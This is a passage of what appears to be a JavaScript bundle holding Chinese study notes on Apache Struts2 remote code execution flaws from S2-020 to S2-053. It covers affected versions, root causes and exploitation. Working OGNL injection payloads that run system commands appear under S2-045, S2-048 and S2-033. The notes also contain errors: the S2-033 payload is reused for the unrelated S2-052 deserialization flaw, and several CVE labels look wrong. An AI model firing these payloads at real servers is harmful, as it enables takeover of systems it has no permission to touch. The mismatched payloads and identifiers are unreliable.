                          1\u3001S2-020 \u7684\u4FEE\u590D\u5728 excludeParams \u7684\u6B63\u5219\u4E2D\u6DFB\u52A0\u4E86 \u300A ^class\\..* \u300B \uFF0C\u8FD9\u79CD\u5F62\u5F0F\uFF0C\u53EF\u4EE5\u8F7B\u6613\u4F7F\u7528\u5982\u4E0B\u65B9\u5F0F\u7ED5\u8FC7\uFF1A
                                  class['classLoader'].resources.dirContext.docBase=
                                  top.class.classLoader.resources.dirContext.docBase=
                                  Class.classLoader.resources.dirContext.docBase=
                          2\u3001\u4E8E\u662F S2-021 \u7684\u4FEE\u590D\u53C8\u6DFB\u52A0\u4E86\u5BF9 classloader \u5B57\u7B26\u7684\u62E6\u622A\u3002
                  4\u3001\u800C S2-022 \u4E0E\u4E4B\u524D\u662F\u76F8\u540C\u7684\u6F0F\u6D1E\uFF0C\u53EA\u4E0D\u8FC7\u7531\u89E6\u53D1\u70B9\u7531 ParametersInterceptor \u53D8\u4E3A\u4E86 CookieInterceptor\u3002
                          \u4E0D\u518D\u8D58\u8FF0\u3002

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-026 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2015-5209\u3001CNVD-2016-01256\uFF09",`

  S2-026 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 - Struts Struts 2.3.24
          \u5229\u7528\u6761\u4EF6
                  1\u3001\u7279\u5B9A\u7684top\u5BF9\u8C61\u53EF\u7528\u4E8E\u8BBF\u95EE struts \u5185\u90E8\u7ED3\u6784\uFF0C\u5141\u8BB8\u653B\u51FB\u8005\u5229\u7528\u8BE5\u6F0F\u6D1E\u7ED5\u8FC7\u5B89\u5168\u9650\u5236\u6267\u884C\u672A\u6388\u6743\u64CD\u4F5C\u3002
                          1\u3001ValueStack\u5B9A\u4E49\u4E86top\u4EE3\u8868\u6267\u884C\u4E0A\u4E0B\u6587Root\u7684\u7279\u6B8A\u5BF9\u8C61\u3002\u5B83\u53EF\u7528\u4E8E\u64CD\u4F5CStruts2\u7684\u5185\u90E8\u7ED3\u6784\u6216\u53EF\u7528\u4E8E\u5F71\u54CD\u5BB9\u5668\u7684\u8BBE\u7F6E\u3002

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u6F0F\u6D1E\u8BE6\u60C5\uFF1A
                  2\u3001\u5B98\u65B9\u7684\u4FEE\u590D\uFF1A
                          1\u3001\u5B98\u65B9\u7981\u6B62\u4E86\u901A\u8FC7\u53C2\u6570\u540D\u4F7F\u7528 top \u8BBF\u95EE\u4E0A\u4E0B\u6587\u4E2D\u7684\u5185\u5BB9\u3002
                          2\u3001\u5B98\u65B9\u63D0\u4F9B\u4E86\u4E00\u4E9B\u65B0\u6B63\u5219\uFF0C\u7528\u6765\u5728\u5176\u4ED6\u7248\u672C\u4E2D\u7F13\u89E3\u8FD9\u4E2A\u6F0F\u6D1E\u60C5\u51B5
                                  \u7B2C\u4E00\u4E2A\uFF1A
                                          "(^|\\\\%\\\\{)((#?)(top(\\\\.|\\\\['|\\\\[\\")|\\\\[\\\\d\\\\]\\\\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\\\\.|\\\\[).*",
                                  \u7B2C\u4E8C\u4E2A\uFF1A
                                          "^(action|method):.*"

          \u539F\u7406\u5206\u6790
                  1\u3001ParametersInterceptor\u4E2D\u7684\u6B63\u5219\u8868\u8FBE\u5F0F\u5C06top['foo'](0)\u4F5C\u4E3A\u6709\u6548\u7684\u8868\u8FBE\u5F0F\u5339\u914D\uFF0C
                          1\u3001GNL\u5C06\u5176\u4F5C\u4E3A (top['foo'])(0) \u5904\u7406\uFF0C\u5E76\u5C06 \u201Cfoo\u201D \u64CD\u4F5C\u53C2\u6570\u7684\u503C\u4F5C\u4E3AOGNL\u8868\u8FBE\u5F0F\u6C42\u503C\u3002
                          2\u3001\u8FD9\u4F7F\u5F97\u6076\u610F\u7528\u6237\u5C06\u4EFB\u610F\u7684 OGNL\u8BED\u53E5 \u653E\u5165\u64CD\u4F5C\u516C\u5F00\u7684\u4EFB\u4F55String\u53D8\u91CF\u4E2D\uFF0C\u5373\u53EF\u5C06\u5176\u8BC4\u4F30\u4E3A OGNL\u8868\u8FBE\u5F0F \u3002
                          3\u3001\u7531\u4E8E OGNL\u8BED\u53E5 \u5229\u7528\u70B9\u5728 HTTP\u53C2\u6570 \u4E2D\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u4F7F\u7528 \u9ED1\u540D\u5355\u5B57\u7B26(\u5982 # ) \u8BBE\u7F6E\u7981\u7528\u65B9\u6CD5\u6267\u884C denyMethodExecution \u5E76\u6267\u884C\u4EFB\u610F\u65B9\u6CD5\uFF0C\u7ED5\u8FC7 ParametersInterceptor \u548C OGNL\u7C7B \u7684\u4FDD\u62A4\u3002

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-029 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-029 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.0 - 2.3.24.1  \uFF08\u4E0D\u5305\u62EC2.3.20.3\uFF09

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                  1\u3001Struts2\u7684\u6807\u7B7E\u5E93\u4F7F\u7528OGNL\u8868\u8FBE\u5F0F\u6765\u8BBF\u95EEActionContext\u4E2D\u7684\u5BF9\u8C61\u6570\u636E\u3002
                          1\u3001\u4E3A\u4E86\u80FD\u591F\u8BBF\u95EE\u5230ActionContext\u4E2D\u7684\u53D8\u91CF\uFF0CStruts2\u5C06ActionContext\u8BBE\u7F6E\u4E3AOGNL\u7684\u4E0A\u4E0B\u6587\uFF0C\u5E76\u5C06OGNL\u7684\u8DDF\u5BF9\u8C61\u52A0\u5165ActionContext\u4E2D\u3002
                          2\u3001\u5728Struts2\u4E2D\uFF0C\u5982\u4E0B\u7684\u6807\u7B7E\u5C31\u8C03\u7528\u4E86OGNL\u8FDB\u884C\u53D6\u503C
                                  <p>parameters: <s:property value="#parameters.msg" /></p>

                                  <s:i18nname="%{#request.params}">su18</s:i18n>
                                  <s:textname="%{#request.params}">su18</s:text>
                          3\u3001struts2\u4F1A\u89E3\u6790value\u4E2D\u7684\u503C\uFF0C\u5E76\u5F53\u4F5COGNL\u8868\u8FBE\u5F0F\u8FDB\u884C\u6267\u884C\uFF0C\u83B7\u53D6\u5230parameters\u5BF9\u8C61\u7684msg\u5C5E\u6027\u3002S2-029\u4F9D\u7136\u662F\u4F9D\u9760OGNL\u8FDB\u884C\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u3002

          \u6F0F\u6D1E\u5229\u7528

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-032 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-032 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.3.20  \u2014\u2014\u2014\u2014  Struts 2.3.28 \uFF082.3.20.3 \u548C 2.3.24.3\u9664\u5916\uFF09

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                  1\u3001\u5F53\u542F\u7528\u52A8\u6001\u65B9\u6CD5\u8C03\u7528\u65F6\uFF0C\u53EF\u4EE5\u4F20\u9012\u53EF\u7528\u4E8E\u5728\u670D\u52A1\u5668\u7AEF\u6267\u884C\u4EFB\u610F\u4EE3\u7801\u7684\u6076\u610F\u8868\u8FBE\u5F0F\u3002
                          1\u3001method:Action \u524D\u7F00\u53BB\u8C03\u7528\u58F0\u660E\u4E3A public \u7684\u51FD\u6570\uFF0C
                                  1\u3001\u53EA\u4E0D\u8FC7\u5728\u4F4E\u7248\u672C\u4E2D Strtus2 \u4E0D\u4F1A\u5BF9 name \u65B9\u6CD5\u503C\u505A OGNL \u8BA1\u7B97\uFF0C\u800C\u5728\u9AD8\u7248\u672C\u4E2D\u4F1A\u3002

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-033 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-033 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          url/orders/4/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=id

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-036 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-036 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u4E0E S2-029/S2-059 \u7C7B\u4F3C\u7684\u6F0F\u6D1E\u70B9\u3002
                  2\u3001\u6B64\u7C7B\u6F0F\u6D1E\u7684\u4E3B\u8981\u6210\u56E0\u662F\u7528\u6237\u7684\u914D\u7F6E\u9519\u8BEF\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001tag \u5185\u5C5E\u6027\u4F7F\u7528 %{...} \u4F1A\u5BFC\u81F4 RCE

          \u6F0F\u6D1E\u5229\u7528


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-037",`

  S2-037
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          url/orders/4/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=id

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-045 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-5638\uFF09",`

  S2-045 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-5638\uFF09

          \u8D44\u6599\uFF1A
                  1. \u53C2\u8003\u8D44\u6599\uFF1Ahttps://www.anquanke.com/post/id/85674


          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.3.5 \u2013 Struts 2.3.31
                  Struts 2.5 \u2013 Struts 2.5.10

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u5728\u4F7F\u7528\u57FA\u4E8E Jakarta\u4E0A\u4F20\u89E3\u6790\u5668 \u63D2\u4EF6\u7684\u6587\u4EF6\u4E0A\u4F20\u529F\u80FD\u65F6\uFF0C\u6709\u53EF\u80FD\u5B58\u5728\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u3002
                          1\u3001\u6076\u610F\u7528\u6237\u53EF\u5728\u4E0A\u4F20\u6587\u4EF6\u65F6\u901A\u8FC7\u4FEE\u6539HTTP\u8BF7\u6C42\u5934\u4E2D\u7684Content\u2014Type\u503C\u6765\u89E6\u53D1\u8BE5\u6F0F\u6D1E\uFF0C\u8FDB\u800C\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u3002\u901A\u8FC7Struts2\u5BF9\u9519\u8BEF\u6D88\u606F\u5904\u7406\u8FDB\u884C\u56DE\u663E\u3002
                                  1\u3001\u4F8B\u5982\uFF1A
                                          1\u3001\u5728\u7CFB\u7EDF\u4E2D\u83B7\u5F97\u7BA1\u7406\u5458\u6743\u9650\uFF0C\u6267\u884C\u6DFB\u52A0\u7528\u6237\u3002
                                          2\u3001\u53EF\u4EFB\u610F\u67E5\u770B\u3001\u4FEE\u6539\u6216\u5220\u9664\u6587\u4EF6\u3002
                                          3\u3001\u9020\u6210\u673A\u5BC6\u6570\u636E\u6CC4\u9732\uFF0C\u91CD\u8981\u4FE1\u606F\u906D\u5230\u7BE1\u6539\u7B49\u91CD\u5927\u5371\u5BB3\u3002
                  2\u3001`.concat(i.v.padding_\u591A\u884C\u6587\u672C_\u589E\u52A0\u5F00\u5934\u7A7A\u683C(ju,"                  "),`

          \u539F\u7406\u5206\u6790
                  1\u3001\u5728Struts2\u4E2D\uFF0C\u6240\u6709\u7684\u8BF7\u6C42\u90FD\u4F1A\u7ECF\u8FC7FilterDispatcher\u7684doFilter\u65B9\u6CD5\u62E6\u622A\u5904\u7406\uFF0C
                          1\u3001doFilter\u521B\u5EFA\u503C\u6808\u3001\u4E0A\u4E0B\u6587\u3001\u5305\u88C5request\u7B49\u4E00\u4E9B\u521D\u59CB\u5316\u64CD\u4F5C\u3002\u81EA Struts 2.5 \u4EE5\u4E0A\u5DF2\u7ECF\u5C06\u8FD9\u4E2A\u6362\u6210\u4E86 StrutsPrepareAndExecuteFilter \u3002
                                  1\u3001\u5728StrutsPrepareAndExecuteFilter\u7684doFilter\u65B9\u6CD5\u4E2D\u901A\u8FC7this.prepare.wrapRequest(request);\u5904\u7406\u8BF7\u6C42\uFF0C
                                  2\u3001\u4E00\u76F4\u8DDF\u8E2A\u5230org.apache.struts2.dispatcher.Dispatcher\u7684wrapRequest()\u65B9\u6CD5\uFF0C
                                          1\u3001\u8BE5\u65B9\u6CD5\u5224\u65AD\u8BF7\u6C42\u7684ContentType\u662F\u5426\u5305\u542Bmultipart/form-data\uFF0C\u5982\u679C\u5305\u542B\uFF0C\u5219\u8FDB\u5165new MultiPartRequestWrapper()\u8FDB\u884C\u521D\u59CB\u5316\u3002
                          2\u3001\u8DDF\u8FDBMultiPartRequestWrapper\u7684\u6784\u9020\u65B9\u6CD5\uFF0C\u5728this.multi.parse(request, saveDir);\u89E3\u6790request\u3002
                                  1\u3001\u5176\u4E2Dthis.multi\u4E3AJakartaMultiPartRequest\u7C7B\u7684\u5BF9\u8C61\uFF0C\u8DDF\u8FDB\u8BE5\u5BF9\u8C61\u7684parse\u65B9\u6CD5\uFF0C
                                          1\u3001\u5728\u5904\u7406\u6076\u610F\u6784\u9020\u7684Content-Type\u6570\u636E\u65F6\u629B\u51FA\u5F02\u5E38\uFF0C\u901A\u8FC7buildErrorMessage\u65B9\u6CD5\u5904\u7406\u5F02\u5E38\u4FE1\u606F\u3002
                                          2\u3001\u8DDF\u8FDBbuildErrorMessage\u65B9\u6CD5\uFF0C\u901A\u8FC7LocalizedTextUtil.findText()\u5904\u7406\u5305\u542B\u5F02\u5E38\u4FE1\u606F\uFF0C\u5176\u4E2D\u5F02\u5E38\u4FE1\u606F\u5B8C\u6574\u5305\u542B\u4E86\u6076\u610F\u6784\u9020\u7684ognl\u8868\u8FBE\u5F0F\u3002
                                          3\u3001\u540E\u7EED\u6D41\u7A0B com.opensymphony.xwork2.util.LocalizedTextUtil \u7684 findText()->getDefaultMessage()->TextParseUtil.translateVariables() \u65B9\u6CD5\u6267\u884C\u8868\u8FBE\u5F0F\u3002

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          \u7B2C\u4E00\u79CD\uFF1A
                                  %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
                          \u7B2C\u4E8C\u79CD\uFF1A
                                  %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}


  `),{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-046 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-9791\uFF09",`

  S2-046 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-9791\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.3.5 \u2014\u2014\u2014\u2014 Struts 2.3.31
                  Struts 2.5 \u2014\u2014\u2014\u2014 Struts 2.5.10

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001`.concat(i.v.padding_\u591A\u884C\u6587\u672C_\u589E\u52A0\u5F00\u5934\u7A7A\u683C(ju,"                  "),`

          \u539F\u7406\u5206\u6790
                  1\u3001\u653B\u51FB\u8005\u901A\u8FC7\u8BBE\u7F6EContent-Disposition\u7684filename\u5B57\u6BB5\uFF0C\u6216\u8005\u8BBE\u7F6EContent-Length\u8D85\u8FC72G\uFF0C\u8FD9\u4E24\u79CD\u65B9\u5F0F\u6765\u89E6\u53D1\u5F02\u5E38\uFF0C
                          1\u3001\u5E76\u5BFC\u81F4filename\u5B57\u6BB5\u7684OGNL\u8868\u8FBE\u5F0F\u5F97\u5230\u6267\u884C\uFF0C\u4ECE\u800C\u8FBE\u5230\u8FDC\u7A0B\u653B\u51FB\u7684\u76EE\u7684\u3002
                          \u8BE5\u6F0F\u6D1E\u4E0E045\u6F0F\u6D1E\u6210\u56E0\u4E00\u6837\uFF0C\u53EA\u662F\u6F0F\u6D1E\u5229\u7528\u7684\u5B57\u6BB5\u53D1\u751F\u4E86\u6539\u53D8\u3002
                  2\u3001\u4E0E045\u76F8\u540C\uFF0C046\u4E5F\u662FOGNL\u6CE8\u5165\uFF0C\u4F46\u51FA\u73B0\u5728\u4E0A\u4F20\u8BF7\u6C42\u7684\u6587\u4EF6\u540D\u5B57\u6BB5\u4E2D\uFF0C\u5E76\u4E14\u9700\u8981NUL\u5B57\u8282\u6765\u62C6\u5206\u6709\u6548\u8D1F\u8F7D\u548C\u5176\u4F59\u5B57\u7B26\u4E32\u3002

          \u6F0F\u6D1E\u5229\u7528


  `),{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-048 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-9791\uFF09",`

  S2-048 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-9791\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Apache Struts 2.3.x \u7CFB\u5217\u4E2D\uFF0C\u542F\u7528\u4E86 struts2-struts1-plugin \u63D2\u4EF6\u7684\u7248\u672C

          \u5229\u7528\u6761\u4EF6
                  1\u3001Apache Struts2 2.3.x \u7CFB\u5217\u542F\u7528\u4E86 struts2-struts1-plugin \u63D2\u4EF6\uFF0C\u5E76\u4E14\u5B58\u5728 struts2-showcase \u76EE\u5F55,

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001\u5176\u6F0F\u6D1E\u6210\u56E0\u662F\u5F53 ActionMessage \u63A5\u6536\u5BA2\u6237\u53EF\u63A7\u7684\u53C2\u6570\u6570\u636E\u65F6\uFF0C\u7531\u4E8E \u540E\u7EED\u6570\u636E \u62FC\u63A5\u4F20\u9012\u540E \u5904\u7406\u4E0D\u5F53 \u5BFC\u81F4\u4EFB\u610F\u4EE3\u7801\u6267\u884C\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001Apache Struts 1\u63D2\u4EF6\u7684Apache Struts 2.3.X\u7248\u672C\u4E2D\uFF0C\u5B58\u5728\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF1A
                          1\u3001\u8BE5\u6F0F\u6D1E\u51FA\u73B0\u4E8EStruts2\u7684\u4E00\u4E2A\u7C7B\u4E2D\uFF0C\u8BE5\u7C7B\u662F\u4E3A\u4E86\u5C06 Struts1 \u4E2D\u7684 Action \u5305\u88C5\u6210\u4E3A Struts2 \u4E2D\u7684Action\uFF0C\u4EE5\u4FDD\u8BC1Struts2\u7684\u517C\u5BB9\u6027\u3002
                          2\u3001\u5728 Struts2\u4E2D\u7684 \u300AStruts1\u63D2\u4EF6\u300B \u542F\u7528\u7684\u60C5\u51B5\u4E0B\uFF0C
                                  1\u3001\u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u4F7F\u7528\u6076\u610F\u5B57\u6BB5\u503C\uFF0C\u6784\u9020\u7279\u5B9A\u7684\u8F93\u5165\uFF0C\u53D1\u9001\u5230ActionMessage\u7C7B\u4E2D\uFF0C
                                          1\u3001\u4ECE\u800C\u5BFC\u81F4\u4EFB\u610F\u547D\u4EE4\u6267\u884C\uFF0C\u8FDB\u800C\u83B7\u53D6\u76EE\u6807\u4E3B\u673A\u7CFB\u7EDF\u6743\u9650

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}


  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-052 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09",`

  S2-052 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.1.2 \u2014\u2014\u2014\u2014 Struts 2.3.33
                  Struts 2.5 \u2014\u2014\u2014\u2014 Struts 2.5.12

          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0

          \u539F\u7406\u5206\u6790
                  1\u3001Struts2 REST\u63D2\u4EF6\u7684XStream\u7EC4\u4EF6\u5B58\u5728\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\uFF0C\u4F7F\u7528XStream\u7EC4\u4EF6\u5BF9XML\u683C\u5F0F\u7684\u6570\u636E\u5305\u8FDB\u884C\u53CD\u5E8F\u5217\u5316\u64CD\u4F5C\u65F6\uFF0C\u672A\u5BF9\u6570\u636E\u5185\u5BB9\u8FDB\u884C\u6709\u6548\u9A8C\u8BC1\uFF0C\u53EF\u88AB\u8FDC\u7A0B\u653B\u51FB\u3002

          \u6F0F\u6D1E\u5229\u7528
                  1\u3001Payload\u5982\u4E0B\uFF1A
                          url/orders/4/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=id

  `,{is_\u5728\u522B\u7684\u6298\u53E0\u4E4B\u4E2D:!0}),Object(u.c)("S2-053 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-1000112\uFF09",`

  S2-053 \u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\uFF08RCE\uFF09 \uFF08CVE-2017-1000112\uFF09
          \u53D7\u5F71\u54CD\u7248\u672C\uFF1A
                  Struts 2.0.1-2.3.33
                  Struts 2.5-2.5.10
          \u5229\u7528\u6761\u4EF6

          \u6F0F\u6D1E\u6982\u8FF0
                  1\u3001Struts2\u5728\u4F7F\u7528Freemarker\u6A21\u677F\u5F15\u64CE\u7684\u65F6\u5019\uFF0C\u540C\u65F6\u5141\u8BB8\u89E3\u6790OGNL\u8868\u8FBE\u5F0F\u3002\u5BFC\u81F4\u7528\u6237\u8F93\u5165\u7684\u6570\u636E\u672C\u8EAB\u4E0D\u4F1A\u88ABOGNL\u89E3\u6790\uFF0C
                          1\u3001\u4F46\u7531\u4E8E\u88ABFreemarker\u89E3\u6790\u4E00\u6B21\u4E4B\u540E\u53D8\u6210\u79BB\u5F00\u4E00\u4E2A\u8868\u8FBE\u5F0F\uFF0C\u88ABOGNL\u89E3\u6790\u7B2C\u4E8C\u6B21\uFF0C\u5BFC\u81F4\u4EFB\u610F\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3002

          \u539F\u7406\u5206\u6790
                  1\u3001\u672C\u6F0F\u6D1E\u5B9E\u8D28\u548CS2-001\u539F\u7406\u662F\u4E00\u6837\u7684\u3002\u90FD\u662F\u5728\u89E3\u6790\u6807\u7B7E\u65F6\u5728 org.apache.struts2.components.UIBean \u7684 end() \u65B9\u6CD5\u4E2D\u901A\u8FC7 evaluateParams() \u5BF9\u6807\u7B7E\u4E2D\u7684\u503C\u8FDB\u884C\u89E3\u6790\u4ECE\u800C\u6267\u884Cognl\u8868\u8FBE\u5F0F\u7684\u3002
                          1\u3001\u5728S2-053\u6F0F\u6D1E\u573A\u666F\u4E2D\uFF0C\u662F\u901A\u8FC7Freemarker\u6A21\u7248\u5F15\u64CE\u6E32\u67D3\u7528\u6237\u8F93\u5165\u6570\u636E\u3002\u5982\u672Cdemo\u573A\u666F\u4E2D\uFF1A\u901A\u8FC7Freemarker\u6E32\u67D3index.ftl\u6587\u4EF6\u3002
                  2\u3001\u5F53submit\u7528\u6237\u8F93\u5165\u7684 message \u65F6\uFF0C\u7ECF IndexAction \u7684 setMessage() \u5904\u7406\u540E\u91CD\u65B0\u5229\u7528Freemarker\u6E32\u67D3index.ftl\u6587\u4EF6\u3002
                          1\u3001\u6B64\u65F6 \${message} \u6E32\u67D3\u4E3A\u7528\u6237\u8F93\u5165\u7684\u5305\u542Bognl\u8868\u8FBE\u5F0F\u7684\u5185\u5BB9\u3002
                          2\u3001\u4E5F\u5373 <@s.hidden name="\${message}"><!--@s.hidden--> \u7684\u5185\u5BB9\u4E3A <@s.hidden name="ognl\u8868\u8FBE\u5F0F"><!--@s.hidden-->\uFF0C
                          3\u3001\u7531\u6B64\u540E\u7EED\u4E0ES2-001\u6D41\u7A0B\u4E00\u6837\uFF0Corg.apache.struts2.components.UIBean#end() -> evaluateParams() -> findString() -> findValue() -> com.opensymphony.xwork2.util.TextParseUtil#translateVariables()


          \u6F0F\u6D1E\u5229\u7528
                  1\u3001\u6F0F\u6D1E\u63A2\u6D4B\uFF1A
                          1\u3001\u5728\u76F8\u5173\u8F93\u5165\u6846\u4E2D\uFF0C\u8F93\u5165 \u300A %{1+1} \u300B \uFF0C
                                  1\u3001\u56DE\u663E\u503C 2\uFF0C\u8BF4\u660E\u6267\u884C\u6210\u529F
                  2\u3001Payload\u5982\u4E0B\uFF1A
